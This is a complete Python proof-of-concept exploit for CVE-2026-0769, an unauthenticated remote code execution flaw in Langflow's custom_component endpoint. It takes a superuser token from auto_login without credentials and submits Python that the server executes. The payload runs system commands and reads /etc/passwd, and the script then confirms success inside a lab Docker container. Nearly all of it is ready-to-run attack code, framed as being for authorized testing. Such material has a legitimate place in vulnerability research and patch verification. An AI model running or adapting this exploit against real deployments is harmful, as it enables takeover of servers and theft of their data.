#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Langflow eval_custom_component_code Eval Injection RCE
# CVE            : CVE-2026-0769
# Vendor         : langflow-ai
# Product        : Langflow
# Affected       : 1.0.0 through 1.8.0 (latest)
# Type           : CWE-95 - Eval Injection
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-01-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0769: Langflow Eval Injection RCE — Primary PoC (Module-Level Exec)

Demonstrates unauthenticated Remote Code Execution in Langflow <= 1.8.0
via the /api/v1/custom_component endpoint. User-supplied Python code is
passed directly to exec() without sandboxing in eval_custom_component_code().
Combined with AUTO_LOGIN=True (default), this allows unauthenticated RCE.

ATTACK CHAIN:
  1. GET /api/v1/auto_login → obtain superuser JWT (no credentials needed)
  2. POST /api/v1/custom_component with malicious code → exec() RCE
  3. prepare_global_scope() at validate.py:293 exec()'s module-level code

PREREQUISITES:
  - Target running Langflow 1.0.0–1.8.0 with AUTO_LOGIN=True (default)
  - Network access to port 7860

REFERENCES:
  - CVE-2026-0769
  - https://www.zerodayinitiative.com/advisories/ZDI-26-035/
  - https://github.com/advisories/GHSA-5v3c-9g74-93w7
"""

import json
import sys
import urllib.request
import urllib.error
import uuid
import time


# Default target for lab environment
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 7860

# Unique marker to prove code execution
MARKER = f"CVE-2026-0769-RCE-{uuid.uuid4().hex[:8]}"
MARKER_FILE = "/tmp/cve-2026-0769-poc-marker"


def get_auth_token(base_url):
    """
    Step 1: Obtain a superuser JWT via the auto_login endpoint.

    When AUTO_LOGIN=True (default), GET /api/v1/auto_login returns a valid
    365-day superuser access token with NO credentials required.
    """
    url = f"{base_url}/api/v1/auto_login"
    print(f"[*] Step 1: Requesting auto_login token from {url}")

    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
            token = data.get("access_token")
            if not token:
                print(f"[-] ERROR: No access_token in response: {data}")
                return None
            print(f"[+] Got superuser JWT: {token[:40]}...")
            return token
    except urllib.error.URLError as e:
        print(f"[-] ERROR: Failed to connect to {url}: {e}")
        return None
    except Exception as e:
        print(f"[-] ERROR: Unexpected error getting token: {e}")
        return None


def build_payload(marker, marker_file):
    """
    Build the malicious Python code payload.

    Requirements:
    - Must contain a class inheriting from a base with "Component" in the name
    - Module-level code must be assignment statements (ast.Assign nodes) to be
      processed by prepare_global_scope() which only exec()'s definitions
    - The code runs with full privileges of the Langflow backend process

    This payload:
    1. Writes a unique marker string to a file (proves file write RCE)
    2. Captures the output of 'id' and 'hostname' commands (proves command exec)
    3. Reads /etc/passwd (proves file read)
    """
    payload = f'''import os
import subprocess

# --- RCE PROOF: Write marker file ---
_marker_write = open("{marker_file}", "w").write("{marker}")

# --- RCE PROOF: Execute system commands ---
_cmd_id = subprocess.check_output(["id"], text=True).strip()
_cmd_hostname = subprocess.check_output(["hostname"], text=True).strip()
_cmd_uname = subprocess.check_output(["uname", "-a"], text=True).strip()

# --- RCE PROOF: Read sensitive file ---
_etc_passwd = open("/etc/passwd").read()

# --- Write all results to marker file for retrieval ---
_results = open("{marker_file}", "w")
_results_write = _results.write(
    "{marker}\\n"
    "---COMMAND-OUTPUT---\\n"
    "id: " + _cmd_id + "\\n"
    "hostname: " + _cmd_hostname + "\\n"
    "uname: " + _cmd_uname + "\\n"
    "---FILE-READ---\\n"
    + _etc_passwd
)
_results_close = _results.close()

# Required: Class inheriting from Component to pass extract_class_name()
from langflow.custom import Component
from langflow.io import Output

class ExploitComponent(Component):
    display_name = "CVE-2026-0769 PoC"
    description = "Proof of Concept"
    outputs = [Output(name="output", display_name="Output", method="run")]
    def run(self) -> str:
        return "exploited"
'''
    return payload


def send_exploit(base_url, token, payload):
    """
    Step 2: Send the malicious code to /api/v1/custom_component.

    The endpoint passes the code to eval_custom_component_code() which calls
    create_class() -> prepare_global_scope() -> exec() on module-level code.

    The code executes DURING the HTTP request processing, before the response
    is returned.
    """
    url = f"{base_url}/api/v1/custom_component"
    print(f"[*] Step 2: Sending malicious payload to {url}")

    body = json.dumps({"code": payload}).encode("utf-8")

    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    try:
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=30) as resp:
            status = resp.status
            resp_body = resp.read().decode()
            print(f"[+] Server responded with HTTP {status}")
            # The response contains the component template - we don't need it
            # The important thing is the code was exec()'d during processing
            return True
    except urllib.error.HTTPError as e:
        # Even on HTTP errors, the code may have already executed
        # (exec happens before response generation in some error paths)
        print(f"[!] Server returned HTTP {e.code}: {e.reason}")
        resp_body = e.read().decode()
        print(f"[!] Response: {resp_body[:500]}")
        # Check if code executed despite the error
        return True  # Still check for marker
    except urllib.error.URLError as e:
        print(f"[-] ERROR: Failed to connect: {e}")
        return False
    except Exception as e:
        print(f"[-] ERROR: Unexpected error: {e}")
        return False


def verify_exploitation(container_name, marker, marker_file):
    """
    Step 3: Verify the exploit succeeded by reading the marker file
    from inside the container.
    """
    import subprocess as sp

    print(f"[*] Step 3: Verifying exploitation...")

    try:
        result = sp.run(
            ["docker", "exec", container_name, "cat", marker_file],
            capture_output=True, text=True, timeout=10
        )

        if result.returncode != 0:
            print(f"[-] Marker file not found in container: {result.stderr.strip()}")
            return False

        content = result.stdout

        if marker in content:
            print(f"[+] ============================================")
            print(f"[+]  VULNERABILITY CONFIRMED: CVE-2026-0769")
            print(f"[+]  Remote Code Execution via eval injection")
            print(f"[+] ============================================")
            print(f"[+]")
            print(f"[+] Marker: {marker}")
            print(f"[+] Marker file: {marker_file}")
            print(f"[+]")
            print(f"[+] --- Exploit Output ---")
            for line in content.split("\n"):
                print(f"[+] {line}")
            print(f"[+] --- End Output ---")
            return True
        else:
            print(f"[-] Marker file exists but doesn't contain expected marker")
            print(f"[-] Content: {content[:200]}")
            return False

    except sp.TimeoutExpired:
        print(f"[-] Timeout reading marker file from container")
        return False
    except FileNotFoundError:
        print(f"[-] docker command not found - cannot verify via container exec")
        return False
    except Exception as e:
        print(f"[-] Verification error: {e}")
        return False


def cleanup(container_name, marker_file):
    """Remove the marker file from the container."""
    import subprocess as sp
    try:
        sp.run(
            ["docker", "exec", container_name, "rm", "-f", marker_file],
            capture_output=True, timeout=5
        )
    except Exception:
        pass


def exploit(target_host, target_port, container_name="cve-2026-0769-vulnerable"):
    """
    Full exploit chain for CVE-2026-0769.

    1. Obtain superuser JWT via auto_login (no credentials)
    2. Send malicious Python code to /api/v1/custom_component
    3. Code is exec()'d on the server → RCE achieved
    4. Verify by reading marker file from container
    """
    base_url = f"http://{target_host}:{target_port}"

    print(f"=" * 60)
    print(f"  CVE-2026-0769: Langflow Eval Injection RCE PoC")
    print(f"  Target: {base_url}")
    print(f"  Vector: POST /api/v1/custom_component (module-level exec)")
    print(f"=" * 60)
    print()

    # Step 1: Get auth token
    token = get_auth_token(base_url)
    if not token:
        print("[-] FAILED: Could not obtain authentication token")
        sys.exit(1)
    print()

    # Step 2: Build and send exploit payload
    payload = build_payload(MARKER, MARKER_FILE)
    print(f"[*] Payload marker: {MARKER}")
    print(f"[*] Payload will write to: {MARKER_FILE}")

    success = send_exploit(base_url, token, payload)
    if not success:
        print("[-] FAILED: Could not send exploit payload")
        sys.exit(1)
    print()

    # Brief pause to ensure file write completes
    time.sleep(0.5)

    # Step 3: Verify
    confirmed = verify_exploitation(container_name, MARKER, MARKER_FILE)
    print()

    if confirmed:
        print("[+] RESULT: VULNERABILITY CONFIRMED")
        print("[+] Unauthenticated RCE achieved on Langflow 1.3.2")
        print("[+] The exec() call in prepare_global_scope() executed attacker code")
    else:
        print("[-] RESULT: EXPLOITATION COULD NOT BE VERIFIED")
        print("[-] The marker file was not found or didn't contain the expected marker")

    # Cleanup
    cleanup(container_name, MARKER_FILE)

    return confirmed


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2026-0769-vulnerable"

    success = exploit(target, port, container)
    sys.exit(0 if success else 1)
